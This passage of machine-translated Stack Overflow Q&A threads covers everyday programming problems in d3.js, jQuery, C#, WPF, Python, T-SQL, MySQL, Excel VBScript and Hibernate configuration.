Dim webClient As New System.Net.WebClient
Dim result As String = webClient.DownloadString(request)

MessageBox.Show(result) 
```

请注意，上面的代码在允许用户再次与应用程序交互之前将等待来自服务器的结果，但这足以让您开始。

# html - 为一小部分标签完成 CSS 重置

> ID：13076546
> 
> 赞同：2
> 
> 时间：2012-10-25T20:15:38.627
> 
> 标签：html, css, firefox, reset

我正在开发一个 Firefox 扩展，它将 HTML 的点点滴滴注入到用户通常浏览的网页中。这些点点滴滴需要在用户可能访问的所有可能页面中正确且一致地设置样式。这意味着 CSS 规则应该覆盖任何 Web 开发人员可能想到的所有可能的修改。同时，在注入的标记中只使用了一小部分 HTML 元素：`div, a, p, span, table, tr, td`.

我正在寻找的是一个完整的 CSS 重置样式表，它将处理主机页面可能对注入的标记造成的所有可能的入侵。有这样的样式表吗？

澄清一下：我想确保以下规则不会搞砸我注入的标记：`p { color: red }`或`p { transform: rotate(7.5deg); }`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:19:55.253

可以使用此样式表将“标准样式”区域包装在未重置的类中。问题是您需要将样式表与 HTML 一起注入。

[https://github.com/jbcrawford/Un-ResetStylesheet](https://github.com/jbcrawford/Un-ResetStylesheet)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T01:20:48.933

如果这仅适用于 Firefox，您可能可以使用[https://developer.mozilla.org/en-US/docs/DOM/window.getDefaultComputedStyle](https://developer.mozilla.org/en-US/docs/DOM/window.getDefaultComputedStyle)来构建此样式表...

# javascript - 使用 d3.js 结合父数据和嵌套数据

> ID：13076553
> 
> 赞同：17
> 
> 时间：2012-10-25T20:15:57.877
> 
> 标签：javascript, d3.js

我有一个这样的数据结构（**假设数据结构是不可协商的**）：

```
data = {
    segments : [
        {x : 20, size : 10, colors : ['#ff0000','#00ff00']},
        {x : 40, size : 20, colors : ['#0000ff','#000000']}
    ]}; 
```

使用[d3.js](https://github.com/mbostock/d3/wiki) javascript 库，我想绘制四个矩形，一个用于两个`colors`数组中的每种颜色。来自数组中每个条目的信息`segments`用于绘制与其`color`数组中每种颜色对应的矩形。例如，红色和绿色矩形的宽度和高度均为 10。生成的 html 应如下所示：

```
<div id="container">
    <svg width="200" height="200">
        <g>
            <rect x="20" y="20" width="10" height="10" fill="#ff0000"></rect>
            <rect x="30" y="30" width="10" height="10" fill="#00ff00"></rect>
        </g>
        <g>
            <rect x="40" y="40" width="20" height="20" fill="#0000ff"></rect>
            <rect x="60" y="60" width="20" height="20" fill="#000000"></rect>
        </g>
    </svg>
</div> 
```

我想出了一些代码来实现这一点，但我发现关于使用来自两个不同嵌套级别的数据的部分`data`令人困惑，我觉得可能有一种更惯用的方式来完成同样的事情 d3.js . 这是代码（完整示例在[http://jsbin.com/welcome/39650/edit](http://jsbin.com/welcome/39650/edit)）：

```
function pos(d,i) { return d.x + (i * d.size); } // rect position
function size(d,i) { return d.size; }            // rect size
function f(d,i) { return d.color; }              // rect color

// add the top-level svg element and size it
vis = d3
    .select('#container')
    .append('svg')
    .attr('width',200)
    .attr('height',200);

// add the nested svg elements
var nested = vis
    .selectAll('g')
    .data(data.segments)
    .enter()
    .append('g');

// Add a rectangle for each color
nested
    .selectAll('rect')
    .data(function(d) {
        // **** ATTENTION ****
        // Is there a more idiomatic, d3-ish way to approach this?
        var expanded = [];
        for(var i = 0; i < d.colors.length; i++) {
            expanded.push({
                color : d.colors[i],
                x     : d.x
                size  : d.size });
        }
        return expanded;
    })
    .enter()
    .append('rect')
    .attr('x',pos)
    .attr('y',pos)
    .attr('width',size)
    .attr('height',size)
    .attr('fill',f); 
```

**是否有更好和/或更惯用的方法来使用 d3.js 从数据结构中的两个不同嵌套级别访问数据？**

# 编辑

这是我想出的解决方案，感谢[meetamit](https://stackoverflow.com/a/13116665/1015178)对闭包想法的回答，并使用更多惯用的 d3.js 缩进感谢[nautat 的回答](https://stackoverflow.com/a/13145734/1015178)：

```
$(function() {
  var
    vis = null,
    width = 200,
    height = 200,
    data = {
        segments : [
           {x : 20, y : 0, size : 10, colors : ['#ff0000','#00ff00']},
           {x : 40, y : 0, size : 20, colors : ['#0000ff','#000000']}
        ]
    };

    // set the color
    function f(d,i) {return d;}

    // set the position
    function pos(segment) {
      return function(d,i) {
        return segment.x + (i * segment.size);
      };
    }

    // set the size
    function size(segment) {
      return function() {
        return segment.size;
      };
    }

    // add the top-level svg element and size it
    vis = d3.select('#container').append('svg')
        .attr('width',width)
        .attr('height',height);

    // add the nested svg elements
    var nested = vis
        .selectAll('g')
          .data(data.segments)
        .enter().append('g');

    // Add a rectangle for each color.  Size of rectangles is determined
    // by the "parent" data object.
    nested
    .each(function(segment, i) {
      var 
          ps = pos(segment),
          sz = size(segment);

      var colors = d3.select(this)
        .selectAll('rect')
          .data(segment.colors)
        .enter().append('rect')
          .attr('x', ps)
          .attr('y',ps)
          .attr('width', sz)
          .attr('height',sz)
          .attr('fill', f);
  });

}); 
```

这是完整的工作示例：http: [//jsbin.com/welcome/42885/edit](http://jsbin.com/welcome/42885/edit)

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-10-29T06:09:27.583

您可以使用闭包

```
var nested = vis
  .selectAll('g')
  .data(data.segments);

nested.enter()
  .append('g')
  .each(function(segment, i) {
    var colors = d3.select(this)
      .selectAll('rect')
      .data(segment.colors);

    colors.enter()
      .append('rect')
      .attr('x', function(color, j) { return pos(segment, j); })
      // OR: .attr('x', function(color, j) { return segment.x + (j * segment.size); })
      .attr('width', function(color, j) { return size(segment); })
      .attr('fill', String);
  }); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-30T18:48:44.890

您可以执行以下操作来重组数据：

```
newdata = data.segments.map(function(s) {
  return s.colors.map(function(d) {
    var o = this; // clone 'this' in some manner, for example:
    o = ["x", "size"].reduce(function(obj, k) { return(obj[k] = o[k], obj); }, {});
    return (o.color = d, o); 
  }, s);
}); 
```

这会将您的输入数据转换为：

```
// newdata:
    [
      [
        {"size":10,"x":20,"color":"#ff0000"},
        {"size":10,"x":20,"color":"#00ff00"}],
      [
        {"size":20,"x":40,"color":"#0000ff"},
        {"size":20,"x":40,"color":"#000000"}
      ]
    ] 
```

然后可以在标准的嵌套数据选择模式中使用：

```
var nested = vis.selectAll('g')
    .data(newdata)
  .enter().append('g');

nested.selectAll('rect')
    .data(function(d) { return d; })
  .enter().append('rect')
    .attr('x',pos)
    .attr('y',pos)
    .attr('width',size)
    .attr('height',size)
    .attr('fill',f); 
```

顺便说一句，如果您想更符合 d3 习惯，我会为链式方法稍微更改缩进样式。Mike 建议每次选择更改时使用半缩进。这有助于使您非常清楚您正在处理的选择。例如在最后一个代码中；变量`nested`指的是`enter()`选择。请参阅“选择”一章：[http ://bost.ocks.org/mike/d3/workshop/](http://bost.ocks.org/mike/d3/workshop/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-28T15:29:50.213

`colors`在您实际开始创建元素之前，我会尝试将其展平。如果数据发生变化，我会更新这个扁平的数据结构并重绘。扁平化的数据需要存储在某个地方以使真正的 d3 转换成为可能。

这是一个对我有用的更长的例子。Yon 可以在[这里](http://jsfiddle.net/juve/wX8cj/1/)看到它的作用。

这是代码：

```
var data = {
    segments : [
        {x : 20, size : 10, colors : ['#ff0000','#00ff00']},
        {x : 40, size : 20, colors : ['#0000ff','#000000']}
    ]
};

function pos(d,i) { return d.x + (i * d.size); } // rect position
function size(d,i) { return d.size; }            // rect size
function f(d,i) { return d.color; }              // rect color

function flatten(data) {
    // converts the .colors to a ._colors list
    data.segments.forEach( function(s,i) {
        var list = s._colors = s._colors || [];
        s.colors.forEach( function(c,j) {
            var obj = list[j] = list[j] || {}
            obj.color = c
            obj.x = s.x
            obj.size = s.size
        });
    });
}

function changeRect(chain) {
    return chain
    .transition()
    .attr('x',pos)
    .attr('y',pos)
    .attr('width',size)
    .attr('height',size)
    .attr('fill',f)
    .style('fill-opacity', 0.5)
}

vis = d3
.select('#container')
.append('svg')
.attr('width',200)
.attr('height',200);

// add the top-level svg element and size it
function update(){

    flatten(data);

    // add the nested svg elements
    var all = vis.selectAll('g')
    .data(data.segments)

    all.enter().append('g');
    all.exit().remove();

    // Add a rectangle for each color
    var rect = all.selectAll('rect')
    .data(function (d) { return d._colors; }, function(d){return d.color;})

    changeRect( rect.enter().append('rect') )
    changeRect( rect )

    rect.exit().remove()
}

function changeLater(time) {
    setTimeout(function(){
        var ds = data.segments
        ds[0].x    = 10 + Math.random() * 100;
        ds[0].size = 10 + Math.random() * 100;
        ds[1].x    = 10 + Math.random() * 100;
        ds[1].size = 10 + Math.random() * 100;
        if(time == 500)  ds[0].colors.push("orange")
        if(time == 1000) ds[1].colors.push("purple")
        if(time == 1500) ds[1].colors.push("yellow")
        update()
    }, time)
}

update()
changeLater(500)
changeLater(1000)
changeLater(1500) 
```

这里重要的是`flatten`执行数据转换并将结果存储/重用`_colors`为父数据元素中的属性的功能。另一条重要的线是；

```
.data(function (d) { return d._colors; }, function(d){return d.color;}) 
```

它指定从哪里获取数据（第一个参数）以及每个数据元素的唯一 ID 是什么（第二个参数）。这有助于识别过渡等的现有颜色。

# jquery - 同一元素上的两个切换，需要它们同步

> ID：13076555
> 
> 赞同：0
> 
> 时间：2012-10-25T20:16:04.127
> 
> 标签：jquery, toggle

我有一个面板，当您单击按钮时会向下滑动。我在页面的底部还有另一个按钮可以切换同一个窗格。问题是，它们彼此独立工作，因此当单击按钮时，它会重新启动链。

HTML

```
<div id="videoPane">
     content inside panel
     //NOTE: the below anchor has a negative bottom margin, so it remains in plain view when the panel is closed.
     <a href="#" class="close"><img src="images/arrow.png"></a>
</div>

<div id="footerNav">
    <a class="vidbtn" id="b4" href="#">Watch Video</a>
</div> 
```

我希望两者都`a.vidbtn`执行`a.close`相同的任务：打开面板；但是，他们需要彼此合作。

我的 Jquery 如下：

```
$("#videoPane a").toggle(function(e){

    $("#videoPane").addClass("videoExpanded");
    $("#b4").addClass("activeBtn");

    e.preventDefault();

}, function(e){
    $("#videoPane").removeClass("videoExpanded");
    $("#b4").removeClass("activeBtn");

    e.preventDefault();
});

$("#b4").toggle(function(e){

    $("#videoPane").addClass("videoExpanded");
    $("#b4").addClass("activeBtn");

    e.preventDefault();

}, function(e){
   $("#videoPane").removeClass("videoExpanded");
    $("#b4").removeClass("activeBtn");

    e.preventDefault();
}); 
```

代码很简单：它们都切换相同的元素 ，`#videoPane`并且它们需要彼此同步工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:23:22.017

创建一个单独的函数来切换视频窗格，然后在单击其他元素时调用它：

```
$("#videoPane a, #b4").click(function (e) {
    e.preventDefault();
    toggleVideoPane();
});

var toggleVideoPane = function () {
    var $videoPane = $('#videoPane');
    if ($videoPane.hasClass('videoExpanded')) {
        $("#videoPane").removeClass("videoExpanded");
        $("#b4").removeClass("activeBtn");        
    ​} else {
        $("#videoPane").addClass("videoExpanded");
        $("#b4").addClass("activeBtn");            
    }
};​​​​​​​​​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:26:25.590

关于什么

```
$("#videoPane a, #b4").click( function( e ) { 
    $("#videoPane").toggle( );
}); 
```

我认为这就是你想要做的。[在这里](http://api.jquery.com/toggle/)查看有关切换的更多信息。

[在这里](http://jsfiddle.net/bruno/Envn8/1/)提琴

# c# - 排序一个 SortedDictionary 按字母顺序，按字母顺序倒序，以及值的频率

> ID：13076556
> 
> 赞同：-5
> 
> 时间：2012-10-25T20:16:06.473
> 
> 标签：c#, dictionary, alphabetical, sorteddictionary

我对 C# 和哈希表/字典的概念是全新的，并且一直在寻找一个直接的答案，但我找不到任何实际有效的解决方案（可能是由于我对主题的无知）所以如果可能的话，我需要一个简单的解决方案。

此外，如果它有所作为，字典中的`String`s 和`int`s 不是数据成员，甚至不是参数。

更多说明：

总体而言，该程序是通过文本文件或直接用户输入导入单词，然后保存它们和它们出现的次数（AKA 存储在`Dictionary/Sorteddictionary`）然后允许用户重新组织数据，按字母顺序、反向字母顺序或按频率和/或打印将它们发送到控制台或将数据写入新的 .txt 文件。

但是现在我只是想让字典的排序工作。

示例输入：另一个伟大的故事和另一个伟大的冒险。

示例输出（按字母顺序）：以字母 A 开头的单词：另一个冒险和以字母 G 开头的字母：great (Ect.)

示例输出（按字母顺序倒序）： 以字母 S 开头的单词：故事 以字母 G 开头的单词：great (ect.)

输出（频率）：出现 2 次的单词数：出现 1 次的另一个大量单词：和冒险故事。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T21:11:02.837

希望这可以帮助。我不确定这是解决您的问题的最佳方法，但它应该可以帮助您熟悉一些选项/看看为什么这里的一些人反对它。如果您让我们更多地了解您正在尝试做的事情，我们可以更好地建议替代方法。

```
using System;
using System.Collections.Generic;
using System.Linq;

namespace StackOverflow.Demos
{
    class Program
    {

        const string OutputFormat = "{0}: {1}";
        public static void Main(string[] args)
        {
            new Program();
            Console.WriteLine("Done");
            Console.ReadKey();
        }
        public Program()
        {
            SortedDictionary<string, int> dic = new SortedDictionary<string, int>();
            dic.Add("a", 1);
            dic.Add("b", 2);
            dic.Add("d", 2);
            dic.Add("c", 1);
            dic.Add("e", 1);
            dic.Add("f", 3);
            dic.Add("g", 4);
            dic.Add("h", 2);
            dic.Add("i", 2);

            OutputByKeyAsc(dic);
            OutputByKeyDesc(dic);
            OutputByValueFrequency(dic);
        }

        void OutputByKeyAsc(SortedDictionary<string, int> dic)
        {
            Console.WriteLine("OutputByKeyAsc");
            foreach (string key in dic.Keys)
            {
                Console.WriteLine(string.Format(OutputFormat, key, dic[key]));
            }
        }

        void OutputByKeyDesc(SortedDictionary<string, int> dic)
        {
            Console.WriteLine("OutputByKeyDesc");
            foreach (string key in dic.Keys.Reverse())
            {
                Console.WriteLine(string.Format(OutputFormat, key, dic[key]));
            }
        }

        void OutputByValueFrequency(SortedDictionary<string, int> dic)
        {
            Console.WriteLine("OutputByValueFrequency");

            IEnumerable<KeyValuePair<int,int>> values = 
                (
                    from sortedItem 
                    in 
                    (
                        from entry 
                        in dic 
                        group entry 
                        by entry.Value
                        into result
                        select new KeyValuePair<int,int>(result.Key , result.Count())
                    )
                    orderby sortedItem.Value descending
                    select sortedItem
                ).ToArray();

            foreach (KeyValuePair<int, int> value in values)
            {
                foreach (KeyValuePair<string, int> item in dic.Where<KeyValuePair<string, int>>(item => item.Value == value.Key))
                {
                    Console.WriteLine(string.Format(OutputFormat, item.Key, string.Format(OutputFormat, item.Value, value.Value)));
                }
            }
        }

    }
} 
```

祝你好运/希望到目前为止你喜欢 c#。

**编辑**

根据您问题中的新信息，这是我尝试更简洁的解决方案：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;

namespace StackOverflow.Demos
{
    class Program
    {

        const string OutputFormat = "{0}: {1}";
        public static void Main(string[] args)
        {
            new Program("Another great story and another great adventure.");
            Console.WriteLine("Done");
            Console.ReadKey();
        }
        public Program(string userInput)
        {
            //break string into words
            IEnumerable<IGrouping<string, int>> words = Regex.Split(userInput, @"\W+").GroupBy(word => word.ToLowerInvariant(), word => 1); //nb converting word to lower case to avoid case sensitive comparisons in grouping - I can keep the original value(s) by replacing "word => 1" with "word => word" if needed

            Console.WriteLine("\nWords in alphabetic order");
            foreach (IGrouping<string, int> wordInfo in words.OrderBy(word => word.Key))
            {
                Console.WriteLine(string.Format(OutputFormat, wordInfo.Key,wordInfo.Count()));
            }

            Console.WriteLine("\nWords in descending alphabetic order");
            foreach (IGrouping<string, int> wordInfo in words.OrderByDescending(word => word.Key))
            {
                Console.WriteLine(string.Format(OutputFormat, wordInfo.Key, wordInfo.Count()));
            }

            Console.WriteLine("\nWords by frequency (desc)");
            foreach (IGrouping<string, int> wordInfo in words.OrderByDescending(word => word.Count()))
            {
                Console.WriteLine(string.Format(OutputFormat, wordInfo.Key, wordInfo.Count()));
            }
        }
    }
} 
```

**编辑**

这是具有类中的功能和程序中保存的输出的相同代码： using System; 使用 System.Collections.Generic；使用 System.Linq；使用 System.Text.RegularExpressions；

```
namespace StackOverflow.Demos
{
    class Program
    {

        const string OutputFormat = "{0}: {1}";
        public static void Main(string[] args)
        {
            new Program("Another great story and another great adventure.");
            Console.WriteLine("Done");
            Console.ReadKey();
        }
        public Program(string userInput)
        {
            WordCounter myWordCounter = new WordCounter(userInput);
            Console.WriteLine("\n**Alphabetical**");
            foreach (KeyValuePair<string, int> wordInfo in myWordCounter.GetWordCountByWordAlphabeticalDesc())
            {
                Console.WriteLine(string.Format(OutputFormat,wordInfo.Key, wordInfo.Value));
            }
            Console.WriteLine("\n**Alphabetical Desc**");
            foreach (KeyValuePair<string, int> wordInfo in myWordCounter.GetWordCountByWordAlphabeticalDesc())
            {
                Console.WriteLine(string.Format(OutputFormat, wordInfo.Key, wordInfo.Value));
            }
            Console.WriteLine("\n**Frequency Desc**");
            foreach (KeyValuePair<string, int> wordInfo in myWordCounter.GetWordCountByFrequency())
            {
                Console.WriteLine(string.Format(OutputFormat, wordInfo.Key, wordInfo.Value));
            }
        }

    }

    public class WordCounter
    {
        string sentance;
        IEnumerable<IGrouping<string, int>> words;
        public WordCounter(string sentance)
        {
            this.sentance = sentance;
            GetWords();
        }
        void GetWords()
        {
            this.words = Regex.Split(this.sentance, @"\W+").GroupBy(word => word.ToLowerInvariant(), word => 1);
        }
        public IEnumerable<KeyValuePair<string, int>> GetWordCountByWordAlphabetical()
        {
            return this.words.OrderBy(word => word.Key).Select(wordInfo => new KeyValuePair<string,int>(wordInfo.Key, wordInfo.Count()));
        }
        public IEnumerable<KeyValuePair<string, int>> GetWordCountByWordAlphabeticalDesc()
        {
            return this.words.OrderByDescending(word => word.Key).Select(wordInfo => new KeyValuePair<string, int>(wordInfo.Key, wordInfo.Count()));
        }
        public IEnumerable<KeyValuePair<string, int>> GetWordCountByFrequency()
        {
            return this.words.OrderByDescending(word => word.Count()).Select(wordInfo => new KeyValuePair<string, int>(wordInfo.Key, wordInfo.Count()));
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:48:09.637

由于您并不*总是*在单个一致排序的庄园中显示数据，因此我认为没有任何令人信服的理由将数据存储在排序的庄园中。您最好只存储您想要的数据，然后在用户请求在某个特别排序的庄园中查看它时对其进行排序。

# c# - 将复选框列添加到 DataGrid

> ID：13076559
> 
> 赞同：0
> 
> 时间：2012-10-25T20:16:17.330
> 
> 标签：c#, wpf, wpf-controls, wpfdatagrid

我正在尝试在 WPF 的数据网格控件中添加一个复选框列。

我已经在 Windows.Forms 中完成了这项工作，而且效果很好。

所以现在我想在 WPF 中为将来编写我的新程序。

我想做的方式：数据将来自数据库作为数据集。

某些字段具有我想显示为复选框的值。现在我已经将 datagrid autocreatecolumn 设置为 true，将显示数据。

现在我想删除显示值的列并添加一个复选框列。

这可能还是我应该通过数据模板创建列？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-27T10:41:56.473

WPF DataGrid 提供了一种称为 AutoGenerateColumns 的功能，它可以根据数据对象的公共属性自动生成列。它根据值的类型生成以下类型的列，您无需执行任何操作：

```
1\. TextBox columns for string values
2\. CheckBox columns for boolean values
3\. ComboBox columns for enumerable values
4\. Hyperlink columns for Uri values 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T05:19:30.607

您可以订阅`AutoGeneratingColumn`事件并更改正在生成的列：

```
public MyWindow(){
       myDataGrid.AutoGeneratingColumn += AutoGeneratingColumnHandler;
}

private void AutoGeneratingColumnHandler(object sender, DataGridAutoGeneratingColumnEventArgs e) {
        var bindingPath = ((e.Column as DataGridBoundColumn).Binding as Binding).Path.Path;
        if (bindingPath == "MYPATH") {
              var checkBoxColumn = new DataGridCheckBoxColumn();
              checkBoxColumn.Binding = new Binding(bindingPath);
              e.Column = checkBoxColumn;
        }
 } 
```

# python - 将布尔列表的真实元素的索引作为列表/元组获取

> ID：13076560
> 
> 赞同：5
> 
> 时间：2012-10-25T20:16:21.497
> 
> 标签：python, json, list

给定一个布尔列表，例如`[True, False, False, True, False, True]`，获取包含原始列表中的 Truthy 元素的索引（从 1 开始，而不是零索引）的列表/元组的*最快方法是什么？*所以对于上面的列表，它应该返回`[1, 4, 6]`or `(1, 4, 6)`。

我正在使用这样的生成器：

```
def get_truthy_ones(self, bool_list):
    return (idx + 1 for idx, value in enumerate(bool_list) if value) 
```

但是，当我想将结果编码到`JSON`对象中时，这会产生问题，因为`JSON`不编码生成器。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-25T20:17:44.553

```
[i for i, elem in enumerate(bool_list, 1) if elem] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-25T20:18:34.860

将括号切换为方括号以返回列表而不是生成器：

```
def get_truthy_ones(self, bool_list):
    return [idx for idx, value in enumerate(bool_list, 1) if value] 
```

或者使用您的原始函数，然后从生成器创建一个列表：

```
list(get_truthy_ones(self, bool_list)) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-25T20:24:09.833

正因为它可以做到，一个替代版本与`itertools.compress()`. 我认为这比其他示例可读性差，所以我不推荐它。

```
>>> list(itertools.compress(*zip(*enumerate([True, False, False, True, False, True], 1))))
[1, 4, 6] 
```

编辑：

```
python -m timeit -s "import itertools" -s "values = [True, False]*10000" "list(itertools.compress(*zip(*enumerate(values, 1))))"
100 loops, best of 3: 2.88 msec per loop

python -m timeit -s "import itertools" -s "values = [True, False]*10000" "[index for index, value in enumerate(values, 1) if value]"
1000 loops, best of 3: 1.11 msec per loop 
```

明显慢，其实，所以绝对不是一个用。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-25T20:52:11.697

如果有办法将列表转换为 numpy 数组，使用 numpy.where() 应该更快：

```
> python -m timeit -s "import numpy" -s "values = numpy.array([True, False]*10000)" "numpy.where(values)"
1000 loops, best of 3: 392 usec per loop

> python -m timeit -s "import itertools" -s "values = [True, False]*10000" "[index for index, value in enumerate(values, 1) if value]"
100 loops, best of 3: 2.1 msec per loop 
```

但是我可能在这里通过在设置中进行转换来作弊。

# sql - “Order By”附近的语法错误 - '关键字'ORDER'附近的语法不正确。'

> ID：13076564
> 
> 赞同：-1
> 
> 时间：2012-10-25T20:17:12.067
> 
> 标签：sql, tsql, stored-procedures

我已经盯着这个太久了，我似乎看不出我哪里出错了。

我有一个存储过程，它必须返回一堆数据，其中“ExtractedText”与该人正在搜索的单词匹配：

```
Select @Command = 'select DISTINCT CaseFileEvents.InvestigatorID,convert(nvarchar,EventDate,111) as ''EventDate'',EventTime,EventDesc,TaskID,Privileged,Private,Email,HasAttachments,FName,LName, FName + '' '' + LName as Name ,CaseFileEvents.FileID,CaseFiles.FileName,ItemEntryGradeID, EventDescPlainText
                from CaseFileEvents
                join ......

                WHERE '+ @FilterField +' LIKE ''%' + @FilterQuery + '%'' ORDER BY ' + @SortName + ' ' + @SortOrder + ''; this area seems to bug out 
```

@FilterField 是其中一个表中的一列，@FilterQuery 是用户键入的要查找的单词。@SortName，是它被排序的名称。

命令示例：@FilterField = "ExtractedText"、@FilterQuery="something"、@SortName="EventID"、@SortOrder="desc"

这是错误：

> 消息 156，级别 15，状态 1，第 10 行
> 关键字“ORDER”附近的语法不正确。

完整命令：

```
WHERE ExtractedText LIKE '%add%' ORDER BY EventID desc; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T00:39:18.343

您不能按变量排序。您需要使用动态 SQL：

```
SELECT
     *
FROM
     My_Table
WHERE
     Whatever = @something
ORDER BY
     CASE @sort_order
          WHEN 'ASC' THEN
               CASE @order_by
                    WHEN 'surname' THEN surname
                    WHEN 'forename' THEN forename
                    WHEN 'fullname' THEN fullname
                    ELSE surname
               END
          ELSE '1'
     END ASC,
     CASE @sort_order
          WHEN 'DESC' THEN
               CASE @order_by
                    WHEN 'surname' THEN surname
                    WHEN 'forename' THEN forename
                    WHEN 'fullname' THEN fullname
                    ELSE surname
               END
          ELSE '1'
     END DESC 
```

看看这个帖子：

*[我可以将 SQL Server 排序顺序存储在变量中吗？](https://stackoverflow.com/questions/709775/can-i-store-sql-server-sort-order-in-a-variable)*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T14:32:06.983

它不起作用的原因是因为我失踪了 `WHERE EventID = convert(nvarcahr,@EventID)` ，只是拿出了“DISTINCT”

# mysql - 具有多个外键的表加入 mysql 中的 1 个外键

> ID：13076565
> 
> 赞同：1
> 
> 时间：2012-10-25T20:17:13.773
> 
> 标签：mysql, sql, database, join

您好我有一个包含以下信息的数据库表：

```
owner.primaryitowner, (bobsmith@mail.com)
owner.secondaryitowner, 
owner.primarybusinessowner, 
owner.secondarybusinessowner
users.username (email bobsmith@mail.com)
users.displayname (e.g. Bob Smith) 
```

问题是所有者仅存储为电子邮件。我通常还有另一张桌子

`inner join users on users.username = owner.primaryitowner to get users.displayname` 所以数据读取正确。`

我能够做到这一点

```
select u.displayname
from users u
inner join owners o on
    o.primaryitowner = u.username
    or o.secondaryitowner = u.username
    or o.primarybusinessowner = u.username
    or o.secondarybusinessowner = u.username 
```

问题是我需要有唯一的列而不是全部放在一列中。

PS 我不能更改数据库我只是一个报告作者。

非常感谢提前

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:22:11.753

您需要将来自用户的每一列电子邮件加入所有者

```
SELECT u.displayname AS userName
   , po.displayName AS PrimaryItOwnerUsernName
   , so.displayName AS SecondaryIdOwnerUserName
FROM users AS u
INNER JOIN owners AS po on u.primaryitowner = po.username
INNER JOIN owners AS so ON u.secondaryitowner = so.username
...
WHERE u.UserName = 'Ryan J Morse' 
```

当您多次加入所有者表（别名）时，这允许您将存储在用户中的电子邮件更改为报告所需的显示名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:28:42.043

这对您的需求有用吗？当您从所有者表的角度来看时，将所有显示名称作为单独的列获取单个所有者记录会更容易。采用另一种方式将从同一用户的多个所有者记录中提取信息。如果这就是你想要的，那么这将行不通。

```
select prim_o.displayname as "Primary IT Owner",
    sec_o.displayname as "Secondary IT Owner",
    prim_bo.displayname as "Primary Business Owner",
    sec_bo.displayname as "Secondary Business Owner"
from owner o
   inner join users prim_o (o.primaryitowner = prim_o.username)
   inner join users sec_o (o.secondaryitowner = sec_o.username)
   inner join users prim_bo (o.primarybusinessowner = prim_bo.username)
   inner join users sec_bo (o.secondarybusinessowner = sec_bo.username) 
```

# excel - Excel VBScript 插入列并填充

> ID：13076566
> 
> 赞同：3
> 
> 时间：2012-10-25T20:17:22.167
> 
> 标签：excel, vbscript

我正在尝试通过脚本在 Excel 电子表格中插入一列。我发现下面的代码应该允许我插入一列，但是我将如何像在 Excel 应用程序中使用 fill>down 或 fill>series 命令那样用数据填充该列？

```
Const xlToRight = -4161
Set objExcel = CreateObject("Excel.Application")
objExcel.Visible = True
Set objWB = objExcel.Workbooks.Open("C:\Temp\Scripts\Test2.xls")
Set objSheet = objwb.Sheets("Overall")
objSheet.Columns("D:D").Insert xlToRight
objWB.Close True
objExcel.Quit 
```

**编辑**

这就是最终的工作。

```
Const xlToRight = -4161
const xlColumns = &H2 
const xlLinear = -4132 
const xlDay = 1
Set objExcel = CreateObject("Excel.Application")
objExcel.Visible = True
Set objWB = objExcel.Workbooks.Open("C:\Temp\Scripts\Test2.xls")
Set objSheet = objwb.Sheets("Overall")
objSheet.Columns("A:A").Insert xlToRight
objSheet.Cells(1, 1).Value = "label"
objSheet.Cells(2, 1).Value = "Value"
set Range = objSheet.Range("A2:A"&objSheet.UsedRange.Rows.Count) 
Range.FillDown
objSheet.Columns("A:A").Insert xlToRight
objSheet.Cells(1, 1).Value = "series"
objSheet.Cells(2, 1).Value = 1
set Range = objSheet.Range("A2:A"&objSheet.UsedRange.Rows.Count) 
Range.DataSeries xlColumns, xlLinear,xlDay, 1, , False
objWB.Close True
objExcel.Quit 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T20:32:28.783

## 如何将值插入单元格

使用 vbscript 的语法（对象模型）似乎与 excel VBA 宏非常相似。

```
objSheet.Cells(2,4).Value = "foo" 
```

如果您在查找某些内容时遇到任何问题，可以使用内置的宏记录器创建一个 excel 宏并查看生成的 vba 代码 - 这有助于我过去更好地理解 excel vba 宏。我假设 vba 代码也可以在 vbscript 中使用。

# java - 休眠、jpa、c3p0 和警告 HHH000208

> ID：13076572
> 
> 赞同：2
> 
> 时间：2012-10-25T20:17:36.907
> 
> 标签：java, hibernate, jpa, connection-pooling, c3p0

我正在使用 Hibernate 4.1.6Final 来访问 JPA 数据源。通过 c3p0 添加连接池时，我遇到了以下日志消息：

```
611  [main] WARN  org.hibernate.service.jdbc.connections.internal.ConnectionProviderInitiator  - HHH000208: org.hibernate.connection.C3P0ConnectionProvider has been deprecated in favor of org.hibernate.service.jdbc.connections.internal.C3P0ConnectionProvider; that provider will be used instead. 
```

以下是我的 POM 中的休眠工件：

```
<dependency>
  <groupId>org.hibernate</groupId>
  <artifactId>hibernate-entitymanager</artifactId>
  <version>4.1.6.Final</version>
</dependency>
<dependency>
  <groupId>org.hibernate</groupId>
  <artifactId>hibernate-c3p0</artifactId>
  <version>4.1.6.Final</version>
</dependency> 
```

以及来自的相关属性`persistence.xml`：

```
<property name="hibernate.connection.provider_class" value="org.hibernate.connection.C3P0ConnectionProvider" />
<property name="hibernate.c3p0.max_size" value="100" />
<property name="hibernate.c3p0.min_size" value="5" />
<property name="hibernate.c3p0.acquire_increment" value="5" />
<property name="hibernate.c3p0.idle_test_period" value="500" />
<property name="hibernate.c3p0.max_statements" value="50" />
<property name="hibernate.c3p0.timeout" value="10000" /> 
```

